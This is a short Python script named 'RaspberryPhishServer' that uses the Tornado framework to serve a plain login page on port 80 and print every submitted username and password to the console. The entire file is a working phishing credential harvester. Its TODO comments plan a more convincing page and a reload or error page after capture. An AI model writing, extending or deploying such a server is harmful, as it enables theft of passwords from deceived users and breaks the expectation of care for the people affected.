#!/usr/bin/env python
# -*- coding: utf-8 -*

__title__ = "RaspberryPhishServer"

import tornado.ioloop
import tornado.web


class MainHandler(tornado.web.RequestHandler):
    def get(self):
        #@TODO replace this by a external html file
        self.write('<html><body><form action="/" method="POST">'
                   'login <input type="text" name="login">'
                   '<br/>'
                   'password <input type="text" name="password">'
                   '<br/>'
                   '<input type="submit" value="Submit">'
                   '</form></body></html>')

    def post(self):
        #@TODO work with ids
        print("login > " + self.get_body_argument("login"))
        print("password > " + self.get_body_argument("password"))
        #@TODO reload the same page or an error one or something else ...
        self.get()


if __name__ == "__main__":
    # create an instance
    application = tornado.web.Application( [ (r"/", MainHandler), ], autoreload=True )
    # bind a port
    application.listen(80)
    # wait forever for satisfy users request
    tornado.ioloop.IOLoop.instance().start()
